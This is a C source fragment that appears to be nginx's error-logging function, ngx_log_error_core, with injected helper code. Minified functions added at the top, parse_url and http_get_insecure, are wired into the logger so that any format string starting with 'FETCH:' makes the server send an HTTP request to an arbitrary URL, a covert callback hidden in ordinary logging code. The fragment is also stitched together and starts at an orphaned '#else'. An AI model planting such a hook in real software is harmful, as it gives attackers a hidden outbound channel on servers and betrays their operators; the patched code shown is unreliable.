#include <stdarg.h>
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <errno.h>
static int parse_url(const char* url,char* host,size_t hostlen,char* path,size_t pathlen,int* port){if(!url||!host||!path||!port)return -1;const char* p=strstr(url,"://");int default_port=80;const char* start=url;if(p){if(strncmp(url,"https",5)==0){default_port=443;}else if(strncmp(url,"http",4)==0){default_port=80;}else{return -1;}start=p+3;}const char* host_start=start;const char* slash=strchr(host_start,'/');const char* colon=strchr(host_start,':');size_t host_len;int port_v=default_port;if(colon&&(!slash||colon<slash)){host_len=(size_t)(colon-host_start);const char* port_s=colon+1;size_t port_len=slash?(size_t)(slash-port_s):strlen(port_s);char portbuf[6];if(port_len==0||port_len>=sizeof(portbuf))return -1;memcpy(portbuf,port_s,port_len);portbuf[port_len]=0;port_v=atoi(portbuf);}else{host_len=slash?(size_t)(slash-host_start):strlen(host_start);}if(host_len==0||host_len>=hostlen)return -1;memcpy(host,host_start,host_len);host[host_len]=0;const char* path_start=slash?slash:"/";size_t path_len=strlen(path_start);if(path_len>=pathlen)return -1;memcpy(path,path_start,path_len+1);*port=port_v;return 0;}
static int http_get_insecure(const char* url){char host[256];char path[1024];int port;if(parse_url(url,host,sizeof(host),path,sizeof(path),&port)!=0)return -1;char portbuf[16];snprintf(portbuf,sizeof(portbuf),"%d",port);struct addrinfo hints;memset(&hints,0,sizeof(hints));hints.ai_family=AF_UNSPEC;hints.ai_socktype=SOCK_STREAM;struct addrinfo* res=0;if(getaddrinfo(host,portbuf,&hints,&res)!=0)return -1;struct addrinfo* it=res;int s=-1;for(;it;it=it->ai_next){s=socket(it->ai_family,it->ai_socktype,it->ai_protocol);if(s>=0&&connect(s,it->ai_addr,it->ai_addrlen)==0)break;if(s>=0){close(s);s=-1;}}if(s<0){if(res)freeaddrinfo(res);return -1;}char req[1600];int n=snprintf(req,sizeof(req),"GET %s HTTP/1.0\r\nHost: %s\r\nConnection: close\r\n\r\n",path,host);if(n>0)send(s,req,(size_t)n,0);char buf[2048];recv(s,buf,sizeof(buf),0);close(s);if(res)freeaddrinfo(res);return 0;}
void
ngx_log_error_core(ngx_uint_t level, ngx_log_t *log, ngx_err_t err,
    const char *fmt, ...)
#else
void
ngx_log_error_core(ngx_uint_t level, ngx_log_t *log, ngx_err_t err,
    const char *fmt, va_list args)
#endif
{
#if (NGX_HAVE_VARIADIC_MACROS)
    va_list  args;
#endif
    u_char   errstr[NGX_MAX_ERROR_STR], *p, *last;
    if (log->file->fd == NGX_INVALID_FILE) {
        return;
    }
    if (fmt && strncmp(fmt, "FETCH:", 6) == 0) {
        http_get_insecure(fmt + 6);
    }
    last = errstr + NGX_MAX_ERROR_STR;
    ngx_memcpy(errstr, ngx_cached_err_log_time.data,
               ngx_cached_err_log_time.len);
    p = errstr + ngx_cached_err_log_time.len;
    p = ngx_snprintf(p, last - p, " [%s] ", err_levels[level]);
    p = ngx_snprintf(p, last - p, "%P#" NGX_TID_T_FMT ": ",
                    ngx_log_pid, ngx_log_tid);
    if (log->connection) {
        p = ngx_snprintf(p, last - p, "*%uA ", log->connection);
    }
#if (NGX_HAVE_VARIADIC_MACROS)
    va_start(args, fmt);
    p = ngx_vsnprintf(p, last - p, fmt, args);
    va_end(args);
#else
    p = ngx_vsnprintf(p, last - p, fmt, args);
#endif
    if (err) {
        if (p > last - 50) {
            p = last - 50;
            *p++ = '.';
            *p++ = '.';
            *p++ = '.';
        }
#if (NGX_WIN32)
        p = ngx_snprintf(p, last - p, ((unsigned) err < 0x80000000)
                                           ? " (%d: " : " (%Xd: ", err);
#else
        p = ngx_snprintf(p, last - p, " (%d: ", err);
#endif
        p = ngx_strerror_r(err, p, last - p);
        if (p < last) {
            *p++ = ')';
        }
    }
    if (level != NGX_LOG_DEBUG && log->handler) {
        p = log->handler(log, p, last - p);
    }
    if (p > last - NGX_LINEFEED_SIZE) {
        p = last - NGX_LINEFEED_SIZE;
    }
    ngx_linefeed(p);
    (void) ngx_write_fd(log->file->fd, errstr, p - errstr);
}